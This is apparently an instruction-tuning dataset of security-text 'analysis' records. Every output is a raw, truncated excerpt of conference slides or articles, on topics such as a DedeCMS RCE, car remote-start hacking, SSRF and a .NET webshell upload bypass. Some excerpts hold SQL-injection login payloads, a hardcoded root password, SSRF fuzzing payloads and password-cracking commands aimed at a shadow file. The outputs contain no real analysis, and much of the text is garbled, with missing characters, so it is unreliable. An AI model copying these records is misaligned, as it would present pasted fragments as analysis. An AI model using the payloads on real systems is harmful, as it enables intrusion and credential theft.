{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n: https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html ** ** ** ** :include/filter.inc.php ** ** dedecmsinclude/common.inc.php post get cookie _RunMagicQuotes get post globals, , filter.inc.php $magic_quotes_gpcgpcaddslashes, foreachkeymagic_quotes_gpc, return filter.inc.php dedecms v5.7 bookfeedback.php , common.inc.php , RCE dedecms v5.8 flink onlymsg1, ,showmsg onlymsg0 function ShowMsg($msg, $gourl, $onlymsg = 0, $limittime = 0){ if (empty($GLOBALS['cfg_plus_dir'])) { $GLOBALS['cfg_plus_dir'] = '..'; } if ($gourl == -1) { $gourl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : ''; if ($gourl == \"\") { $gourl = -1; } } $htmlhead = \" <html>\\r\\n<head>\\r\\n<title>DedeCMS</title>\\r\\n <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset={dede:global.cfg_soft_lang/}\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1, maximum- scale=1, user-scalable=no\\\"> <meta name=\\\"renderer\\\" content=\\\"webkit\\\"> <meta http-equiv=\\\"Cache-Control\\\" content=\\\"no-siteapp\\\" /> <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"{dede:global.cfg_assets_dir/}/pkg/uikit/css/uikit.min.css\\\" /> <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\" {dede:global.cfg_assets_dir/}/css/manage.dede.css\\\"> <base target='_self'/> </head> <body> \" . (isset($GLOBALS['ucsynlogin']) ? $GLOBALS['ucsynlogin'] : '') . \" <center style=\\\"width:450px\\\" class=\\\"uk-container\\\"> <div class=\\\"uk- card uk-card-small uk-card-default\\\" style=\\\"margin-top: 50px;\\\"> <div class=\\\"uk-card-header\\\" style=\\\"height:20px\\\">DedeCMS </div> <script>\\r\\n\"; $htmlfoot = \" </script> </center> <script src=\\\"{dede:global.cfg_assets_dir/}/pkg/uikit/js/uikit.min.js\\\"></script> <script src=\\\"{dede:global.cfg_assets_dir/}/pkg/uikit/js/uikit-icons.min.js\\\"></script> </body>\\r\\n</html>\\r\\n\"; $litime = ($limittime == 0 ? 1000 : $limittime); //1000 $func = ''; flinkshowmsg gourl-1 if ($gourl == '-1') { if ($limittime == 0) { $litime = 3000; } $gourl = \"javascript:hi", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nPractical Foxhunting 101 Adam Wirth - SimonJ Overview  About me  About Foxhunting  Equipment Overview & Selection  Preparation  Techniques 2 Who Am I?  More than 15 years professional experience as a software & systems engineer  Most of my career has been spent working on wireless communications & emitter geolocation systems  Last years winner of the Hide & Seek and Foxhunt events in the Wireless Pentathlon 3 What is Foxhunting?  Finding the physical location of wireless emitters and/or their users, by measuring received power from different locations  Foxhunting is between the \"last mile\" and the last feet; for greater or lesser distances, other techniques are more appropriate  Wet-work ninjas ﬁnding the correct bedroom in the house of the South American populist government ofﬁcial  Tracking the Corporate Exec whose iPhone you've trojaned into an access point, as part of a Red Team penetration test  DEFCON 22 Wireless CTF  Techniques are applicable to all RF emitters, like mobiles phones, WiFi APs, heart monitors, etc. 4 What Equipments Involved?  Antennas  Omnidirectional and directional, for different purposes  Radios  Capable of receiving the signal-of-interest  Software-deﬁned radios are ﬁnally becoming affordable  Visualization Software  Most important feature is viewing received power over time 5 Gear Selection: Antennas 6 Photo courtesy of NASA Aperture Versus Gain  As a rule, the more sensitive the antenna, the more focused (directional) its reception pattern  Too much gain can be a bad thing  High gain requires accurate pointing  Power curve follows the Inverse-Square Law  Unless you can attenuate your gain, you lose range discrimination when youre close to an emitter 7 Omnidirectional Antennas  Typically have a toroidal radiation pattern  Gain varies inversely with z-axis directionality  For foxhunting, high gain is good  Provides greater detection distance  Allows some degree of attenuation by varying orientation 8 Directional Antennas  There are only tw", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nQuantum Computers vs. Computers Security @veorq  http://aumasson.jp Schrodinger equation Entanglement Bell states EPR pairs Wave functions Uncertainty principle Tensor products Unitary matrices Hilbert spaces Nobody understands this stuff, and you dont need it to understand quantum computing 1. QC 101 2. In practice 3. Breaking crypto 4. Post-quantum crypto 5. Quantum key distribution 6. Quantum copy protection 7. Quantum machine learning 8. Conclusions 1. QC 101 Quantum mechanics Natures operating system Quantum mechanics Mathematics Gravity Electromagnetism Nuclear forces Applications OS Hardware Quantum mechanics Particles in the universe behaves randomly Their probabilities can be negative \"Negative energies and probabilities should not be considered as nonsense. They are well-defined concepts mathematically, like a negative of money.\" Paul Dirac, 1942 α |0 + β |1 When observed 0 with probability α2 1 with probability β2 Once observed, stays either 0 or 1 forever Quantum bit (qubit) α0x00 |0x00 + + α0xfe |0xfe + α0xff |0xff Again, the sum of probabilities α2 equals 1 The αs are called amplitudes Generalizes to 32- or 64-bit quantum words Quantum byte Set of quantum registers (bits/bytes/words) Quantum assembly instructions: Transform the probabilities of the register Probabilities should still sum to 1 Linear math transforms (matrix products) A program ends with a measurement Quantum computer Quantum computer simulators Impossible with a classical computer Possible with a quantum computer! The killer app You heard about NP-complete problems? SAT, scheduling, Candy Crush, etc. Solution hard to find, but easy to verify QC does not solve NP-complete problems! QC vs. hard problems NNP P (easy) NNP NP (hard) NNP BQP (quantum) Quantum speedup Make the impossible possible Example: Factoring integers Hard classically (exponential-ish) Easy with a quantum computer! Obvious application: break RSA! Quantum parallelism Qubits encode all values at the same time! Caveat: you ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nSecurity Vulnerabilities on Online Payment: Summary and Detection Qing Zhang(VulpeckerTeam@Qihoo 360) Joint work with Guangdong Bai (Faculty Member in SIT), Ye Zhou (VulpeckerTeam@Qihoo 360)  01 Web 3.0时代的 安全漏洞 层出不穷的支付安全漏洞 1 Black Hat US 2016. Mendoza. Samsung Pay: Tokenized Numbers, Flaws and Issues. Token泄露 IEEE S&P 2011: Rui Wang et.al. How to Shop for Free Online Security Analysis of Cashier-as-a-Service Based Web Stores 支付协议实现的安全漏洞  NDSS 2014: Pellegrino et.al. Toward Black-Box Detection of Logic Flaws in Web Applications  NDSS 2014: Sun et.al. Detecting Logic Vulnerabilities in E-Commerce Applications 开源商庖代码的安全漏洞 为什么这么多的支付安全漏洞呢 2 支付安全漏洞一般是涉及协议以及逻辑方面较之其他安全漏洞更难察觉 开发者缺乏支付安全的知识储备与开发经验 电商网站使用开源代码更新不及时存在严重的支付安全风险 移动端带来了新的攻击面 第三方支付掉链子 安全通信协议不安全 薅羊毛 影响 由亍支付过程涉及金钱因此支付安全漏洞较之其他类型的安全漏洞具有更高 的敏感性和危害性 3 资金蒸发 0元支付  我们的工作 4 2 支付漏洞的检测与防护 在线支付漏洞的研究及挖掘 1  总结了15种类型的在线支付的安全漏洞  研究了80多个电商网站以及APP共检测到8种新型支付漏洞 所有漏洞均已告知商家现已修复 3 现在以及未来工作  支付协议的形式化验证  02 那些便宜的 商品 类型一支付金额完整性 - 篡改支付金额 支付流程及攻击方式 5 示例一某VPN贩买网站 6 类型二订单完整性 - 订单生成后加货物 示例来源Rui Wang et.al IEEE S&P 2011 7 类型三支付凭证重放 贩买成功后会有一个从银行向商户网站跳转的过程如果这个过程反复的 重放有可能会导致商品的反复贩买和增加但是用户不需要支付更多的金钱 8 类型三支付凭证重放 - 中间人攻击 攻击者设置一个商家并向自己支付然后将支付成功的消息重放到正 常商家 9 商家 欺诈 者 冒牌 商家 选择产品然后 到支付页面 告诉商家我已 支付成功 贩买跳转到银行 选择与在正常商家一致的 产品并模拟所有参数 最主要是模拟返回地址 类型四第三方支付漏洞导致所有商家信息泄露 漏洞原因  第三方支付完成后页面从支付网站跳转到商家网站  如果修改支付订单的订单号页面自动跳转到该订单对应的商家  跳回的页面中含有用户在商家的订单信息  遍历订单号攻击者可以获取在该第三方支付网站上支付成功的所有订单 10 11 示例X钱支付 危害性 据我们统计数千家在线贩物网站受到此漏洞的影响 我们在X宝支付等其他第三方支付平台发现 过同样类型的漏洞 12 类型五数字签名未覆盖完整 此案例金额已经做了签名校验但是仍然有一个未签名的参数会对最后 的交易造成影响从而导致了问题的发生@koohik 13 类型六订单替换 14 15 类型七货币单位完整性 - 货币单位替换 这种问题多发生在paypal等国际支付的场景 16 示例这是一个印尼盾变美元的故事 17 类型八溢出攻击 - 金额数字溢出 如果支付过程中没有对支付金额的上限进行安全控制那么有可能会导致程序进入异常处理 流程比如说买不管买多少货物金额都是固定的再严重一点就会导致0元支付 @imlonghao 18 类型九顺序执行缺陷 贩买过程 19 A B C D 支付 @sex is not show 20 示例轻松买票 类型十用户完整性 - 用户替换 花别人的钱买自己的东西 21 示例瞬间成为初创员工有木有 22 类型十一密钥泄露 内置支付功能的app为了设计上的方便有可能会把私钥硬编码到代码戒配置文件中 导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改 23 类型十二凼数修改 apk反编译之后的凼数修改有可能导致商家在最后一步向支付方提交订单时未验证 信息的准确性虽然此时已经对信息进行签名但是仍然被篡改 24 25 示例篡改支付信息 ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nYour Car Is My Car About me  Software Engineer by trade  Hacker by passion  Lock picker for fun  The best puzzles are not meant to be solved  All opinions are my own, and may not reflect those of my past, present, or future employers  Twitter: @Jmaxxz Backstory Image Source:https://commons.wikimedia.org/wiki/File:Raynauld.jpg Traditional car ignitions  Lock + Switch Image source: https://www.autozone.com/batteries-starting-and-charging/ignition-switch/duralast-ignition-switch/342354_0 \"Modern\" Car Ignitions  Lock + Electronic Lock + Switch \"Data-link\" bus 5V UART 9600 BAUD 0C 0E 03 32 03 FF FF F1 35 0D Start Sentinel End Sentinel Direction (I.E. Garbage) Command Length Payload (Address) Checksum Demos Particle.io firmware can be found at: https://github.com/jmaxxz/OpenRemoteStart MyCar (Cellular Remote) MyCar AKA  Linkr-LT1  MyCar Kia  Visions MyCar  Carlink (CL6) How does this happen? RX TX Tips for using Uart  3.3v 115200 baud uart  Change server AT+XIP=\"173.27.224.18\",46033  root password is oelinux123  https://fccid.io/2AEB4AG21/User-Manual/User-manual-3104674 RX TX Demo Example Vectors Untargeted (admin) UserName: API Password: f\") OR \"1\"<>\"1 Targeted UserName: example@example.com\" OR (\"1\"<>\"1 Password: a\") OR \"1\"<>\"1 Remote Starting a Car Demo Getting Command Status No Direct Object Reference? Duplicate Information  USER_EMAIL  ACCOUNT_ID Duplicate Info Can Lead to Bugs // Case 3 if(USER_EMAIL owns ACCOUNT_ID) { DoCommand(); } // Case 4 if(USER_EMAIL owns ACCOUNT_ID AND ACCOUNT_ID owns DEVICE_ID){ DoCommand(); } // Case 1 if(USER_EMAIL owns DEVICE_ID){ DoCommand(); } // Case 2 if(ACCOUNT_ID owns DEVICE_ID){ DoCommand(); } Direct Object Reference An attacker could Remotely  Locate car  Unlock car  Start car  Lock car  Trigger alarm  Edit car  Check the status of any command MyCar's Fix For Hardcoded Password Old: New: Reverse Proxies Don't Fix Everything MyCar shows your car's current location But And track the most common places you visit Unlike public cloud e", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nReverse-engineering 4G hotspots for fun , bugs  and net financial loss . Who am I? Hardware at Pen Test Partners. Spent a lot of time in routers and modems for the past few years. Did a bunch of certs & a bunch of CVEs to prove something? Tinkered with BitFi hacking last year. Love to use pseudonyms. What am I talking about today? 4G hotspots AKA cellular routers! 1. Why cellular routers? 2. Attack surface/threat model. 3. Example: ZTE MF910 (et al) 4. Example: Netgear Nighthawk M1 5. Miserable conclusion Scary! (apparently) 5G is coming - so what? More consumers & business users will use cellular for daily TCP/IP. More modems, dongles and routers in the world. Not been much public scrutiny on consumer cellular networking gear in particular? Whats up with cellular routers? Not many vendors doing cellular kit. Lots of code reuse in the industry. All computers are terrible. Theres probably some bugs, eh? Cellular Basics! They do TCP/UDP/IP over cellular these days!! Not inherently secure (obviously?) APN ~= a LAN you dont control. Might be well configured! Or might be crap. Regardless, youre still on a LAN = not on Shodan https://blog.radiatorsoftware.com/2016/07/flexible-m2miot-service-with-radiator.html APN Security On a well-conﬁgured APN (private/M2M/IoT-speciﬁc) we might see:  Client segregation  Outbound web ﬁltering/proxy  Internal DNS  IMEI ﬁltering  IMEI/ICCID pair ﬁltering  Anomalous behaviour detection  Anything youd hope to see on any private corporate network! Not always the case. Higher-Risk Attack Surface (Actual bugs) Web conﬁguration interface Old-fashioned RCE if exposed to the WAN. Client-side (CSRF) RCE on other TCP/UDP services RCE via SMS/MMS?? If you know the phone # Lower-Risk Attack Surface (Not really bugs?) I like having a shell on my router though! Any physical way to grab info or get shells: USB Flash memory Bootloader UART JTAG/SWD Whatever proprietary nightmare interface. These are more often useful or interesting for us, rather than ris", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nConversation with Gary Webb May 2000 Was it worth it? Yes. The CIA admitted it. I know it was the truth, and thats what kept me going. I knew I was right. My eyes were wide open. I knew what I was getting into. The kids suffered. I had the paper behind me  I thought. Support came from all sorts of places. Especially African Americans. My wife was OK with it. She was used to me getting death threats. You get one chance in a lifetime to do the right thing. If you dont do it, you surrender, and then they win. These are the worst people on earth that youre dealing with  they lie, plant stories, discredit and worse for a living and have the resources and the experience. But somebodys got to do it. Otherwise they win. The choice is to do the work -- surrender. He was told he was the most cynical but also in some ways the most naive and idealistic. He was mentored by a journalist who taught him that the work was to comfort the afflicted and afflict the comfortable. When he killed himself, I thought of this late-night conversation. Who won? Who won?", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nBug Bounty on Steroids @Hussein98D We provide pentests! Visit WebImmunify.com October 2022 whoami? Bug Bounty Hunter Security Researcher Yahoo Elite Intigriti 1337up0533 winner H1-2010 Vigilante Award H1-2010 Best Team Collaboration BugCrowd BugBash Best Team Collaboration +1000 vulnerabilities reported CEO @ WebImmunify.com @hussein98d on all platforms Account TakeOver via Confusion The Un-spotable SSRF Local File Disclosure and Bypasses Hacking a Bank by Finding a 0day SSO Bypass Techniques Another XSS Level In this talk:  Application allows user A to invite other users: B, to his organization  User A is able to ask for password reset for accounts he invited  User B gets reset token link in his mails Account TakeOver via Confusion Can we try to exploit this? PoC  User A invites user B to his instance where user B is his second email address  User A asks for password reset of user B  User B opens the reset link and waits  User A edits User Bs email to victims email  Reset Password Tokens becomes valid for Victim Account TakeOver via Confusion User A User B Step 1 Invitation to join org Step 2 User A Password Reset inside App User B Account TakeOver via Confusion User B User B Step 3 Opens Link to Password Reset Step 4 User A Change email of user B to victims Link Account TakeOver via Confusion Attacker Victim Step 5 Reset Password via previous link Step 6 Attacker Login with new password Victim Account TakeOver via Confusion The Un-spotable SSRF Anything catches your attention? The Un-spotable SSRF __region=eu-west-1 Where do we usually see this parameters value? AWS S3! The Un-spotable SSRF Testing Methodology for such endpoints First, we set a random value inside the __region parameter __region=test&Action=ListTopics&appId=223 Result: Timeout response Thats fishy! The Un-spotable SSRF Testing Methodology for such endpoints Fuzzing Build a little list containing different payloads to hopefully identify some behavior list.txt : 0xp.cc 0xp.cc/ @0xp.cc \\\\0xp.cc //0xp", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n.NET 文件上传多个场景绕过预编译限制获取 Shell Ivan1ee@dotNet 安全矩阵 [ dotNet 安全矩阵]  聚焦于微软.NET 安全技术关注基于.NET 衍生出的各种红蓝攻防对抗技术分享内容不限于 .NET 代码审计 最新的.NET 漏洞分析反序列化漏洞研究有趣的.NET 安全 Trick.NET 开源软件分享. NET 生态等热点话题愿你能在这里学 到实在的干货共同推动.NET 安全氛围卷起来 配套的[ dotNet 安全矩阵]知识星球优惠活动持续进行价格直接给 到星球最低起步价[50] 每天只需要 1 块钱不到就可以让自己 从.NET 小白成为高手因为星球里的资料和教程很少在市面上广泛 传播价值完全划算还可以获得阿里蚂蚁字节等大厂内推实习 或社招岗位的机会欢迎对.NET 感兴趣的小伙伴们加入我们一起 做一件有情有意义的事 0X01 背景 在攻防演练的这个大背景下红蓝对抗也逐渐真正的提升到对抗这个层次这 不今天由 dotNet 安全矩阵星球圈友们组成的微信群里有位群友问起如何突破 预编译拿 webshell 有什么方法预编译已经够麻烦了这位师傅还非常有挑战 的加上了不考虑跨目录的情况下怎么获取 webshell借师傅这么有挑战的命题 笔者系统性的介绍预编译几种不同场景下获取 shell 的手段希望本文探讨的这 些可行性路径以及达成目标使用的不同方法能在实战中有所帮助 0X02 困局 .NET 站点发布时提供一项预编译的能力可以提升站点运行处理的速度以及保 护知识版权采用了这种预编译模式后站点下的每个.NET 文件的内容被标记为 \"这是预编译工具生成的标记文件不应删除!\"如果此时上传一个普通的 aspx 木马访问后提示 \"未预编译文件因此不能请求该文件\"如下图所示那么 这种场景下如何通过文件上传漏洞获取 WebShell 呢笔者想到了以下不同场 景下的几种变通的方法在正式介绍方法前首先回顾下预编译的原理 0X03 用法 .NET 下的编译方式大致可以分成两种方式分别为动态编译和预编译动态编译因为文件 以源代码的形式放置于 Web 容器中所以对于首次访问编译时需要消耗大量的资源这 样会严重降低 Web 应用的响应速度另外代码内容是开放的容易被篡改导致系统不安 全或崩溃从知识产权来看也不利于保护商业秘密以上这两点动态编译的劣势也是开发 者选择预编译的两种原因预编译模式下将编译所有的.NET 文件当然 HTML图片 css 等静态资源文件不包含在内在预编译过程中编译器将创建的程序集存储于项目根目 录下的 Bin 文件夹另外也会同步到一个.NET 特殊的目 录 %SystemRoot%\\Microsoft.NET\\Framework\\version\\Temporary ASP.NET Files 文件夹 下Bin 目录下会编译生成两类为文件一类是扩展名为.compiled该文件包含指向与该 页相应的程序集名称另一类文件是编译后的扩展名为.dll 的程序集文件下面笔者分几 个小节分别介绍预编译发布过程和生成的结果文件 3.1 编译选项 创建.NET MVC 项目后右击选择 发布系统提供了文件夹FTPIIS云发布等多种途 径笔者选择了传统的 IIS 发布发布就绪后配置 Release 选项打开预编译详细配置页 面默认情况下系统勾选了 \"允许更新预编译站点\"这样的好处在于可以很轻松的修改代 码方便应急维护但不好的方面就是不安全未能达到保护软件知识版权的目的如果 不勾选允许更新预编译站点项目下的所有 aspx 文件的内容都将被重写为 这是预编译 工具生成的标记文件不应删除!而文件本身也只是个占位符 除了图形化界面操作预编译之外Visual Studio 还提供了命令行下的可执行程序 aspnet_compiler 预编译.NET 项目具体的命令释义如下 名称 释义 aspnet_compiler -v /Lib -p D:\\Project\\VisualStudio\\Pre\\WebForm\\test D:\\test - fixednames -v 表示指向的虚拟地址路径 /Lib -p 要编译的源 Web 项目所在文件夹以及输出的目的文件夹 -fixednames 表示每个.aspx 都编译生成单独的 dll 文件并使用固定文件名 经过编译后项目文件夹中的所有.aspx, .ashx 及 App_Code 中的.cs 文件都会被编译成 DLL 文件静态资源文件将原封不动的复制到目的文件夹里 3.2 complied 保留文件 .NET 每一次编译都会生成很多具有.compiled 扩展名的保留文件这个文件本质上是一个 XML 文件命名格式如下其中[page]是页面的名称[folder-hash]是对页面所在路径的 Hash", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\narXiv:2102.09980v3 [cs.CR] 4 Mar 2022 A ﬂow-based IDS using Machine Learning in eBPF Maximilian Bachl, Joachim Fabini, Tanja Zseby Technische Universitat Wien ﬁrstname.lastname@tuwien.ac.at AbstracteBPF is a new technology which allows dynamically loading pieces of code into the Linux kernel. It can greatly speed up networking since it enables the kernel to process certain packets without the involvement of a userspace program. So far eBPF has been used for simple packet ﬁltering applications such as ﬁrewalls or Denial of Service protection. We show that it is possible to develop a ﬂow-based network intrusion detection system based on machine learning entirely in eBPF. Our solution uses a decision tree and decides for each packet whether it is malicious or not, considering the entire previous context of the network ﬂow. We achieve a performance increase of over 20% compared to the same solution implemented as a userspace program. I. INTRODUCTION A. eBPF eBPF is a technology which makes the Linux kernel pro- grammable by enabling the injection of pieces of code at many locations of the kernel code. eBPF can be dynamically injected during runtime and is veriﬁed to make sure that it cannot crash and cannot get caught in inﬁnite loops. However, this veriﬁcation is only possible for programs that are not turing- complete. Thus eBPF programs cannot contain features such as loops of arbitrary length but instead loops must always have a maximum number of iterations. Also, backward jumps in the code are generally not allowed. This means eBPF can only be used to implement algorithms which do not require turing-completeness. eBPF programs are usually written in C and are ﬁrst compiled to eBPF bytecode. Upon injection into the kernel, this eBPF bytecode is veriﬁed and dynamically compiled to native code. eBPF is especially suitable for packet processing: When a packet arrives at a network interface, certain actions can be performed such as dropping the packet. This is useful fo", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nO P E N S O U R C E FA I R Y D U S T JOHN MENERICK S E C U R I T Y D R A G O N @ N E T S U I T E T H E V I E W S A N D O P I N I O N S E X P R E S S E D H E R E A R E M Y O W N O N LY A N D I N N O WAY R E P R E S E N T T H E V I E W S , P O S I T I O N S O R O P I N I O N S - E X P R E S S E D O R I M P L I E D - O F M Y E M P L O Y E R ( P R E S E N T A N D PA S T ) O R A N Y O N E E L S E . M Y T H O U G H T S A N D O P I N I O N S C H A N G E F R O M T I M E T O T I M E ; T H I S I S A N AT U R A L O F F S H O O T O F H AV I N G A N O P E N A N D I N Q U I S I T I V E M I N D . WHAT WE ARE NOT TALKING ABOUT WHAT WE ARE TALKING ABOUT NO ONE SAID IT WAS SECURE EVERYBODYS JOB IS NOBODYS JOB This is a story about four people named Everybody, Somebody, Anybody, and Nobody. There was an important job to be done and Everybody was asked to do it. Everybody was sure Somebody would do it. Anybody could have done it, but Nobody did it. Somebody got angry about that, because it was Everybody's job. Everybody thought Anybody could do it but Nobody realized that Everybody wouldn't do it. ! It ended up that Everybody blamed Somebody when Nobody did what Anybody could have done. Financial Fun Hobbyist Activist  O P E N S O U R C E P R O J E C T S P L AY A C R U C I A L R O L E I N T H E D I G I TA L A G E B U T A R E M A I N TA I N E D B Y A S M A L L , S T R A I N E D C A D R E O F V O L U N T E E R S .  Functionality Usability Performance Security Stability Compliance  T H E R E A R E L O T S O F C R I T I C A L L I B R A R I E S M A I N TA I N E D B Y V O L U N T E E R S T H AT A R E N O T G I V E N E N O U G H AT T E N T I O N  The system must not require secrecy and can be stolen by the enemy without causing trouble. C / C++ ! MEMORY LIFECYCLE AND BOUNDARY MANAGEMENT IS A BITCH IN APPLICATION LOGIC JAVA IT IS NOT LIKE JAVA GOT INSECURE ALL OF A SUDDEN. IT HAS BEEN INSECURE FOR YEARS. PHP PHP 0DAY FOR EVERYONE NO STRATEGY NO SECURITY CONTACT OR REPORTING DEFINED Inconsisten", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nSecuring MMOs A Security Professionals View From the Inside Who Is This Guy?  Security industry professional  Years writing subversive software  Static analysis tools for C and Java  Former Senior Software Engineer at Bioware Mythic  Pwned other games  Ran Defcon CTF & Quals for 4 years as part of Kenshoto What This Talk Includes  Thoughts on what it's like to go from security to gaming  Stories on how bad it currently is  Some examples of hacks & tools in the wild  Some thoughts on how the games industry can get better at security  Why it wont get better any time soon What This Talk Doesnt Include  0-day  Release date for Star Wars: The Old Republic  Crappy clip-art  Shout-outs Making the Jump  Alternate slide title: How I Learned to Stopped Worrying and Love the Shorts  Expectations  Coming from a world where crashes and vulns mean a big deal  Going to a world where crashes are matter-of-course and extended downtime might elicit an apology on a forum  From a world of KB to a world of GB  No matter how much code you write, your binary will still be smaller than the intro video  30-60 minutes for compilation, 3-5 minutes for linking Making the Jump  High Performance  4000 simultaneous clients per \"shard\"  Under 100ms of latency  Dozens of commands per user per second  4Hz target server frame speed  Low Speed  Much slower paced  Greater tendency for formal education Challenges of Security in an MMO  The Rest of the World  Most servers have well-defined, community- reviewed specs  Many are restricted to trusted users  Some are open-source and benefit from peer review Challenges of Security in an MMO  Games  We define a spec as we go  Features are added, cut, change scope  We give a connection to anyone that asks  Often for free  We closely guard our code  All of this makes our lives harder Challenges of Security in an MMO  More sophisticated games breed more sophisticated hacks  Client-side security is always a losing battle  But you can have fun trying  It's an arms ", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n01 02 03 MS Just Gave the Blue Team Tactical Nukes (And How Red Teams Need To Adapt) 2 IBM Security Whoami  @retBandit  Red Team Ops Lead at IBM X-Force Red  Part of CREST (crest-approved.org)  I like mountain biking, drones, and beer  Canadian, sorry not sorry 3 IBM Security 4 IBM Security Tactical Nukes? 5 IBM Security 6 IBM Security TTP Host Recon Gain a Foothold External Recon Internal Recon Dominance Lateral Movement Exploit Vulnerabilities Spear Phishing Social Engineering Malicious USB Media Wireless Physical Host Recon Host Controls/Logging Recon Host Controls Bypass Tools Transfer Short-Term Persistence Host Privilege Escalation Credential Theft Network Recon Domain Recon Asset Recon Admin Recon Network Security Recon Passive Information Gathering Active Information Gathering Port Scanning Service Enumeration Network/App Vuln Identification Evade Network Security Controls Lateral Movement Network Exploitation Elevate Network Privileges Gain Domain Admin Gain Asset Admin Sensitive Asset Access Exfill Sensitive Data Long-Term Persistence 7 IBM Security Were Talking Post Breach Source: https://blogs.microsoft.com/microsoftsecure/2016/11/28/disrupting-the-kill-chain/ 8 IBM Security The Laboratory 9 IBM Security ATP Overview Source: MS 10 IBM Security Coming in Release 3 Defender brand expanded to include:  Windows Defender Antivirus  Windows Defender Advanced Threat Protection  Windows Defender.... Exploit Guard  ... Application Guard  ... Device Guard  ... Credential Guard  More OS Source: https://blogs.windows.com/business/2017/06/27/announcing-end-end-security-features-windows-10/ https://techcrunch.com/2017/06/08/microsoft-confirms-its-acquired-hexadite-sources-say-for-100m/ 11 IBM Security 12 IBM Security Gaining a Foothold 13 IBM Security Gaining a Foothold w/ Out Of The Box PS Payloads 14 IBM Security Obfuscated PS Payloads 15 IBM Security They promised us freedom. 16 IBM Security But delivered slavery. 17 IBM Security ATP is a Beneficiary of WMF 5 / Win", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\n1 strace抓取ssh登录凭证的问题 起因是在p的知识星球有师傅提问到这个问题 关于https://xz.aliyun.com/t/7698中提到的strace抓取ssh密码的法以前看到有提到抓密 码可以但是抓私钥不能登录这个问题但是也没做实验只是简单的以为是抓取的私钥不完整之类没有 深究后来个师傅提到这个私钥根本不是来登录的所以就研究了下 因为ssh中密码登录的时候虽然传来的请求会通过公钥加密但是在服务端对密码有个解密过程如 下图所示 所以在服务端是有可能抓到密码的 为什么能抓到密码 为什么抓不到密钥 2 密钥登录的时候服务端会成个随机的字符串然后公钥加密这个字符串发给客户端然后客户 端解密最后服务端再去对客户端解密的结果是否正确下图仅作为说明细节不定完全符合 这个过程中根本不存在客户端的私钥传递的过程所以是不可能抓到登录私钥的 总结就是可以抓密码抓不到私钥", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nSeccubus Analyzing vulnerability assessment data the easy way Who am I? Frank Breedijk  Security Engineer at Schuberg Philis  Author of Seccubus  Blogger for CupFigther.net Email: fbreedijk@schubergphilis.com Twitter: @Seccubus Blog: http://cupfighter.net Project: http://www.seccubus.com Company: http://www.schubergphilis.com Photo taken by Arthur van Schendel A story about two guys These and all non-attributed photos of Frank Breedijk are taken by Jan Jacob Bos C. Lueless B. Rightlad Mission: Perform a weekly vulnerability scan of all our public IP addresses C. Lueless Decides to use a regular vulnerability scanner needs to get up very early manually starts his scan and waits finishes the scan and goes back to sleep  and analyzes the report in the morning B. Rightlad Uses Seccubus  he spends the morning configuring Seccubus  goes home  ... Relaxes   the scanning happens at night  Image: Orion's Umbra, a Creative Commons Attribution Non- Commercial (2.0) image from jahdakinebrah's photostream  and when he wakes up   he can analyze the findings and remediate Problem description  Nessus is a very powerful vulnerability scanner  Free (As in beer) TCP/IP security scanner  Best valued security scanner (sectools.org survey of 2000, 2003 and 2006)  Nessus generates a lot of output. Maybe too much?  Scanning takes a lot of time and is not automated  A lot of time is spent on analysis  Nessus GUI is not great for analyzing scans  Work risk ratio What is Seccubus  Seccubus is a wrapper around vulnerability scanners  GUI is geared towards analyzing and ticking-off findings that have been seen  Compares consecutive scans  Supports multiple scanners:  Nessus  OpenVAS  Nikto  More to follow What does Seccubus do differently? Scanning is started from the command line  This means it can be started from cron The findings are stored in a database  Currently the database is a directory structure Presentation via a WebGUI  Easy triage via filtering  Status allows you to tick-off findin", "category": "text_analysis", "source": "security_papers"}
{"instruction": "请分析这段安全相关的文本内容", "input": "", "output": "安全文本分析：\n\nsslssh 0x00 0x01    0x02  SangforDlan sangfor123 123456 Sangfor123  crunch 5 5 -t %%%% -o wordlist2.txt cat wordlist2.txt | sed -e 's//admin/' > output.txt john --wordlist=output.txt shadow 0x03      0x04", "category": "text_analysis", "source": "security_papers"}
